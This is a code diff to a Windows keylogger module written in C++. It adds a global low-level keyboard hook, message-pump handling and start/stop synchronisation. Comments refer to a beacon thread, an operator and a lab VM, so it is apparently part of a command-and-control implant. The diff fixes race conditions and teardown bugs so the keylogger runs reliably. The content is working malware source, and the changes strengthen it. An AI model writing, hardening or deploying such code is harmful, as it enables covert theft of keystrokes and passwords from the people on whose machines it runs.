@@ -15,6 +15,9 @@ static std::mutex         g_mtx;
 static std::atomic<bool>  g_active{false};
 static std::thread        g_thread;
 static DWORD              g_tid    = 0;      // thread id — used to post WM_QUIT on stop
+static std::mutex         g_lifeMtx;         // serialises start/stop against each other
+static HANDLE             g_ready  = nullptr; // manual-reset: hook thread attempted install
+static HANDLE             g_stopped = nullptr; // manual-reset: hook thread finished teardown
 
 // ─── Hook callback ────────────────────────────────────────────────────────────
 // Runs on the hook thread. WH_KEYBOARD_LL fires for all physical keyboard input
@@ -68,14 +71,44 @@ static LRESULT CALLBACK KeyProc(int nCode, WPARAM wParam, LPARAM lParam) {
 }
 
 // ─── API ─────────────────────────────────────────────────────────────────────
+// Lifecycle notes (these were all real defects, not style):
+//   * The old start path checked g_active, then created the thread with no
+//     lock. Two callers could both pass the check; the second assignment to
+//     g_thread destroyed a still-joinable std::thread, which is std::terminate
+//     — the whole process died, not just the keylogger.
+//   * The old start path slept 200ms and hoped the hook thread had set g_tid.
+//     On a busy lab VM it had not, so KeylogStop posted WM_QUIT to thread id 0,
+//     the pump never exited, and the hook stayed installed for the process
+//     lifetime while the operator was told collection had stopped.
+//   * KeylogStop returned without any confirmation of teardown, so lab cleanup
+//     could not be trusted to have taken effect.
 void KeylogStart() {
+    std::lock_guard<std::mutex> lk(g_lifeMtx);
     if (g_active.load()) return;
-    g_active = true;
 
+    if (!g_ready)   g_ready   = CreateEventW(nullptr, TRUE, FALSE, nullptr);
+    if (!g_stopped) g_stopped = CreateEventW(nullptr, TRUE, FALSE, nullptr);
+    if (!g_ready || !g_stopped) {
+        if (g_ready)   { CloseHandle(g_ready);   g_ready   = nullptr; }
+        if (g_stopped) { CloseHandle(g_stopped); g_stopped = nullptr; }
+        return;
+    }
+    ResetEvent(g_ready);
+    ResetEvent(g_stopped);
+
+    // Reap a previous run instead of overwriting a joinable thread object.
+    if (g_thread.joinable()) g_thread.join();
+
+    g_active = true;
     g_thread = std::thread([]() {
         g_tid  = GetCurrentThreadId();
-        g_hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyProc, NULL, 0);
-        if (!g_hook) { g_active = false; return; }
+        g_hook = SetWindowsHookExW(WH_KEYBOARD_LL, KeyProc, NULL, 0);
+        if (!g_hook) {
+            g_active = false;
+            SetEvent(g_ready);
+            return;
+        }
+        SetEvent(g_ready);
 
         // The message pump is required — WH_KEYBOARD_LL callbacks are dispatched
         // through the message queue of the thread that installed the hook.
@@ -97,17 +130,36 @@ void KeylogStart() {
         UnhookWindowsHookEx(g_hook);
         g_hook = NULL;
         g_tid  = 0;
+        SetEvent(g_stopped);
     });
-    g_thread.detach();
 
-    // Give the hook ~200ms to install before returning
-    Sleep(200);
+    // Block until the hook thread reports the install outcome, so g_tid is
+    // guaranteed valid by the time this returns. Bail out cleanly if it never
+    // schedules at all rather than starting a keylogger we cannot stop.
+    if (WaitForSingleObject(g_ready, 5000) != WAIT_OBJECT_0) {
+        g_active = false;
+        DWORD tid = g_tid;
+        if (tid) PostThreadMessageW(tid, WM_QUIT, 0, 0);
+        if (g_stopped) WaitForSingleObject(g_stopped, 5000);
+        if (g_thread.joinable()) g_thread.join();
+    }
 }
 
 void KeylogStop() {
+    std::lock_guard<std::mutex> lk(g_lifeMtx);
     if (!g_active.load()) return;
     g_active = false;
-    if (g_tid) PostThreadMessageW(g_tid, WM_QUIT, 0, 0);
+
+    const DWORD tid = g_tid;
+    if (tid) PostThreadMessageW(tid, WM_QUIT, 0, 0);
+
+    // Do not wait on or join our own thread: today Stop runs on the beacon
+    // thread, but a caller dispatched from the hook thread would otherwise
+    // deadlock on its own teardown event.
+    if (tid && tid != GetCurrentThreadId()) {
+        if (g_stopped) WaitForSingleObject(g_stopped, 5000);
+        if (g_thread.joinable()) g_thread.join();
+    }
 }
 
 std::wstring KeylogDump() {
